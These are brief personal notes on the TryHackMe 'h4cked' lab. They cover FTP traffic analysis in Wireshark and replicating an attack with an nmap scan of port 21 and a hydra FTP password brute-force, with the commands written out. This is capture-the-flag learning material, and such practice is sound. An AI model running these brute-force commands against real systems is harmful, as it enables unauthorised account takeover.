Learned about h4cked on tryhackme

#1st part::

used wireshark to answer various question on thm using the FTP( File Transfer Protocol )

#2nd part
using various commands to replicate the attack

ex used 
```
sudo nmap -p21 -sV -vv -oN new/report.txt "ipaddress of machine"
```
![[Pasted image 20241028154942.png]]
now to crack the password we use hydra

```
hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.93.22
```

![[Pasted image 20241028155530.png]]

